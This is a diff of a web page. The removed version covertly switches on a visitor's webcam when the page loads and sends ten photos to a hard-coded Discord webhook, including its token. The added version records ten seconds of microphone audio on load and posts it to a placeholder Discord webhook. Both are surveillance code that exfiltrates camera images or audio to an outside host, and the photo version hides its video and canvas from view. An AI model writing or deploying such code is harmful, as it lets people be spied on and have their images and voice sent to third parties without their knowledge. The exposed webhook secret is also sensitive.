@@ -3,75 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Automatic Multiple Photo Capture</title>
-    <style>
-        video, canvas {
-            display: none; /* Hide video and canvas */
-        }
-    </style>
+    <title>Auto Audio Recorder</title>
 </head>
 <body>
-    <video id="video" autoplay></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <h1>Audio Recorder</h1>
+    <p>Recording will start after 3 seconds...</p>
 
     <script>
-        const discordWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';  // Replace with your Discord webhook URL
+        const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
 
-        // Initialize the camera
-        async function initCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
-                captureMultiplePhotos();  // Start capturing photos
-            } catch (error) {
-                console.error("Error accessing camera:", error);
-            }
+        async function recordAudio() {
+            // Request microphone permissions
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+
+            // Collect audio data
+            mediaRecorder.ondataavailable = (event) => {
+                chunks.push(event.data);
+            };
+
+            // Start recording after 3 seconds
+            setTimeout(() => {
+                mediaRecorder.start();
+                console.log("Recording started...");
+
+                // Stop recording after 10 seconds
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    console.log("Recording stopped...");
+
+                    mediaRecorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        chunks = []; // Reset chunks array
+                        
+                        // Convert blob to file to send it to Discord
+                        const file = new File([blob], "audio_recording.webm", { type: "audio/webm" });
+
+                        // Send the audio file to Discord
+                        const formData = new FormData();
+                        formData.append("file", file);
+
+                        fetch(discordWebhookUrl, {
+                            method: 'POST',
+                            body: formData,
+                        }).then(response => {
+                            if (response.ok) {
+                                console.log("Audio sent to Discord successfully.");
+                            } else {
+                                console.error("Failed to send audio to Discord.");
+                            }
+                        }).catch(error => console.error("Error:", error));
+                    };
+                }, 10000); // Stop after 10 seconds
+            }, 3000); // Start after 3 seconds
         }
 
-        // Capture multiple photos with a delay of 3 seconds between each
-        async function captureMultiplePhotos() {
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            let captureCount = 0;
-            const maxCaptures = 10;
-            const captureInterval = 3000; // 3 seconds
-
-            // Function to capture a photo and send it to Discord
-            async function captureAndSendPhoto() {
-                context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);  // Capture frame from video
-                const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));  // Convert canvas to Blob
-
-                // Send image Blob to Discord as an attachment
-                const formData = new FormData();
-                formData.append('file', imageBlob, `capture_${captureCount + 1}.png`);
-
-                try {
-                    const response = await fetch(discordWebhookURL, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    if (!response.ok) {
-                        console.error("Failed to send image to Discord:", response.statusText);
-                    }
-                } catch (error) {
-                    console.error("Error sending image to Discord:", error);
-                }
-            }
-
-            // Loop to capture images at intervals
-            const captureIntervalId = setInterval(async () => {
-                if (captureCount < maxCaptures) {
-                    await captureAndSendPhoto();  // Capture and send each photo
-                    captureCount++;
-                } else {
-                    clearInterval(captureIntervalId);  // Stop capturing after 10 photos
-                }
-            }, captureInterval);
-        }
-
-        // Start everything on page load
+        // Automatically start recording when page loads
         window.onload = () => {
-            initCamera();
+            recordAudio();
         };
     </script>
 </body>
